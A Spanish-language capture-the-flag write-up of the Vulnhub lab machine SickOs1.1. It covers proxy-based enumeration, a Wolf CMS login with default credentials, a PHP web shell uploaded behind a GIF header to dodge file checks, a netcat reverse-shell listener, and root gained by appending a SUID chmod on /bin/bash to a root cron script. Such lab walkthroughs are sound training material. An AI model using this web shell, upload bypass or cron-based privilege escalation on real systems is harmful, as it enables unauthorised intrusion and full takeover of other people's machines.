---
title: SickOs1.1 Writeup - Vulnhub
date: 2025-02-11
categories: [Writeups, Vulnhub OSCP Prep]
tags: [Linux, Vulnhub, CTF, HTTP, SickOs1.1, OSCP Prep]
image:
  path: /assets/img/commons/vulnhub/SickOs1.1/portada.png
---

Anterior [**OSCP Lab 2**](https://lvs3c.github.io/posts/OSCP-LordOfTheRoot_1.0.1/)

¡Saludos!

`OSCP Lab 3`

En este writeup, nos adentraremos en la primer máquina [**SickOs1.1**](https://www.vulnhub.com/entry/sickos-11,132/). 
Se trata de una máquina **Linux** en la cual veremos:
- **enumeración de servicios**.
- **Squid Proxy** para consumir recurso interno de la máquina víctima.
- **File Upload** para subir un archivo el cual nos genere la reverse shell.
- **Tarea CRON** modificando un archivo python para añadir el bit SUID a la bash, convirtiéndonos en root y obtener las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ sudo arp-scan -I ens37 --localnet --ignoredups
Interface: ens37, type: EN10MB, MAC: 00:0c:29:ef:5b:48, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.15     00:0c:29:4f:83:c1       VMware, Inc.
10.11.12.200    00:50:56:e3:1f:27       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.477 seconds (103.35 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.15
PING 10.11.12.15 (10.11.12.15) 56(84) bytes of data.
^C
--- 10.11.12.15 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

La máquina no responde `ping`, esto puede deberse a reglas de firewall.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.15 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 18:09 -03
Nmap scan report for 10.11.12.15
Host is up (0.00038s latency).
Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
3128/tcp open  squid-http
MAC Address: 00:0C:29:4F:83:C1 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 26.60 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ sudo nmap -p22,3128 -sCV 10.11.12.15 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 18:11 -03
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 18:11 (0:00:06 remaining)
Nmap scan report for 10.11.12.15
Host is up (0.00066s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open  http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
MAC Address: 00:0C:29:4F:83:C1 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.58 seconds
```

El informe de `Nmap` nos revela:
- Puerto `22` servidor `OpenSSH 5.9p1`.
- Puerto `3128` servidor `Squid http proxy 3.1.19`.


### Squid Proxy - 3128

Lo que debemos hacer acá es configurarnos el proxy en nuestro navegador, para poder pasar mediante él a los recursos internos del servidor.

Yo uso FoxyProxy en firefox.

![squidproxy](/assets/img/commons/vulnhub/SickOs1.1/squidproxy.png){: .center-image }

Validamos la web mediante el proxy.

![web](/assets/img/commons/vulnhub/SickOs1.1/web.png){: .center-image }


Volvemos a correr nmap mediante el proxy.

```bash
❯ nmap -sT -Pn --proxies http://10.11.12.15:3128 10.11.12.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 18:27 -03
Nmap scan report for 10.11.12.15
Host is up (0.00031s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
3128/tcp open   squid-http
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 4.88 seconds
```

Observamos que pasando por el proxy, el puerto 8080 está cerrado, lo tendremos en cuenta para más adelante.

### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.15/ --proxy 10.11.12.15:3128
http://10.11.12.15/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[10.11.12.15], PHP[5.3.10-1ubuntu3.21], Via-Proxy[1.0 localhost (squid/3.1.19)], X-Cache[localhost,localhost:3128], X-Powered-By[PHP/5.3.10-1ubuntu3.21]
```

Continuamos realizando fuzzing de directorios y archivos con `gobuster`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.11.12.15 -e -x php,txt,zip,bak,bkp,html --proxy http://10.11.12.15:3128
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://10.11.12.15:3128
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip,bak,bkp,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.15/.html                (Status: 403) [Size: 284]
http://10.11.12.15/index                (Status: 200) [Size: 21]
http://10.11.12.15/index.php            (Status: 200) [Size: 21]
http://10.11.12.15/connect              (Status: 200) [Size: 109]
http://10.11.12.15/robots.txt           (Status: 200) [Size: 45]
http://10.11.12.15/robots               (Status: 200) [Size: 45]
http://10.11.12.15/.html                (Status: 403) [Size: 284]
http://10.11.12.15/server-status        (Status: 403) [Size: 292]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos la entrada `/robots.txt` la cual con tiene una url que nos lleva al `CMS WOLF`.

Volvemos a lanzar `gobuster` sobre los directorios `/wolfcms` y `/wolfcms/?`.

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.11.12.15/wolfcms -e -x php,txt,zip,bak,bkp,html --proxy http://10.11.12.15:3128
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.15/wolfcms
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://10.11.12.15:3128
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip,bak,bkp,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.15/wolfcms/.html                (Status: 403) [Size: 292]
http://10.11.12.15/wolfcms/index.php            (Status: 200) [Size: 3975]
http://10.11.12.15/wolfcms/index                (Status: 200) [Size: 3975]
http://10.11.12.15/wolfcms/docs                 (Status: 301) [Size: 317] [--> http://10.11.12.15/wolfcms/docs/]
http://10.11.12.15/wolfcms/public               (Status: 301) [Size: 319] [--> http://10.11.12.15/wolfcms/public/]
http://10.11.12.15/wolfcms/config.php           (Status: 200) [Size: 0]
http://10.11.12.15/wolfcms/config               (Status: 200) [Size: 0]
http://10.11.12.15/wolfcms/favicon              (Status: 200) [Size: 894]
http://10.11.12.15/wolfcms/robots               (Status: 200) [Size: 0]
http://10.11.12.15/wolfcms/robots.txt           (Status: 200) [Size: 0]
http://10.11.12.15/wolfcms/wolf                 (Status: 301) [Size: 317] [--> http://10.11.12.15/wolfcms/wolf/]
http://10.11.12.15/wolfcms/composer             (Status: 200) [Size: 403]
http://10.11.12.15/wolfcms/.html                (Status: 403) [Size: 292]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished
===============================================================
```

```bash
❯ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.11.12.15/wolfcms/?" -e -x php,txt,zip,bak,bkp,html --proxy http://10.11.12.15:3128
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.15/wolfcms/?
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   http://10.11.12.15:3128
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,zip,bak,bkp,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.15/wolfcms/?/.html                (Status: 200) [Size: 3975]
http://10.11.12.15/wolfcms/?/articles.html        (Status: 200) [Size: 3507]
http://10.11.12.15/wolfcms/?/articles             (Status: 200) [Size: 3507]
http://10.11.12.15/wolfcms/?/html                 (Status: 200) [Size: 3975]
http://10.11.12.15/wolfcms/?/0                    (Status: 200) [Size: 3725]
http://10.11.12.15/wolfcms/?/0.html               (Status: 200) [Size: 3725]
http://10.11.12.15/wolfcms/?/admin                (Status: 302) [Size: 0] [--> /wolfcms/?/admin/login]
http://10.11.12.15/wolfcms/?/admin.html           (Status: 302) [Size: 0] [--> /wolfcms/?/admin/login]
```

Encontramos un panel de login, al cual podemos acceder usando las credenciales por defecto: `admin/admin`.

![login](/assets/img/commons/vulnhub/SickOs1.1/login.png){: .center-image }

![loginok](/assets/img/commons/vulnhub/SickOs1.1/loginok.png){: .center-image }


## Explotación

---

Si buscamos por `searchsploit`, encontramos lo siguiente:

```bash
❯ searchsploit wolfcms 0.8.2
--------------------------------------------------------- ---------------------------------
 Exploit Title                                           |  Path
--------------------------------------------------------- ---------------------------------
Wolf CMS 0.8.2 - Arbitrary File Upload                   | php/webapps/36818.php
Wolf CMS 0.8.2 - Arbitrary File Upload (Metasploit)      | php/remote/40004.rb
```

Lo que vamos a hacer, es subir nuestro propio archivo .php y vizualizarlo en la web.

![upload_file](/assets/img/commons/vulnhub/SickOs1.1/upload_file.png){: .center-image }

Cargamos nuestro archivo php con el siguiente código:

```bash
❯ cat cmd.php
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: cmd.php
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ GIF8;
   2   │ <?php
   3   │ system($_GET['cmd']);
   4   │ ?>
```

`GIF8;` Hace referencia a los magic numbers de gif, por si hay validaciones de extensión, con esto podemos evitarlas.

Los archivos se encuentran en: `http://10.11.12.15/wolfcms/public`.

![file](/assets/img/commons/vulnhub/SickOs1.1/file.png){: .center-image }

![cmd](/assets/img/commons/vulnhub/SickOs1.1/cmd.png){: .center-image }


## Escalación de privilegios

---

Teniendo ejecución de código gracias al archivo `cmd.php`, procedemos a lanzarnos una reverse shell.

![reverse](/assets/img/commons/vulnhub/SickOs1.1/reverse.png){: .center-image }

```bash
❯ sudo rlwrap nc -nlvp 9999
[sudo] password for lvs3c:
listening on [any] 9999 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.15] 50750
bash: no job control in this shell
www-data@SickOs:/var/www/wolfcms/public$ whoami
www-data
www-data@SickOs:/var/www/wolfcms/public$
```

Usamos la herramienta [**Pspy**](https://github.com/DominicBreuker/pspy) y vemos una tarea `CRON` ejecutada por el usuario root sobre un archivo python, sobre dicho archivo tenemos permiso para modificarlo.


`Tarea CRON`

```bash
2025/02/12 04:26:01 CMD: UID=0     PID=20472  | /usr/bin/python /var/www/connect.py
2025/02/12 04:26:01 CMD: UID=0     PID=20471  | /bin/sh -c /usr/bin/python /var/www/connect.py
2025/02/12 04:26:01 CMD: UID=0     PID=20470  | CRON
```

Añadimos nuestro códogo al archivo, para cambiar los permisos de la bash añadiendo el `bit SUID`.

```bash
echo "import os; os.system('chmod u+s /bin/bash')" >> /var/www/connect.py
```

Procedemos a ejecutar bash con privilegios (-p) sobre root y listamos la Flag.

```bash
www-data@SickOs:/var/www/wolfcms/public$ cat /var/www/connect.py
cat /var/www/connect.py
#!/usr/bin/python

print "I Try to connect things very frequently\n"
print "You may want to try my services"

www-data@SickOs:/var/www/wolfcms/public$ echo "import os; os.system('chmod u+s /bin/bash')" >> /var/www/connect.py
< os; os.system('chmod u+s /bin/bash')" >> /var/www/connect.py
www-data@SickOs:/var/www/wolfcms/public$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash

www-data@SickOs:/var/www/wolfcms/public$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 920788 Mar 28  2013 /bin/bash

www-data@SickOs:/var/www/wolfcms/public$ bash -p
bash -p
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
cd /root
ls
a0216ea4d51874464078c618298b1367.txt
cat a0216ea4d51874464078c618298b1367.txt
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
```

Hope it helps!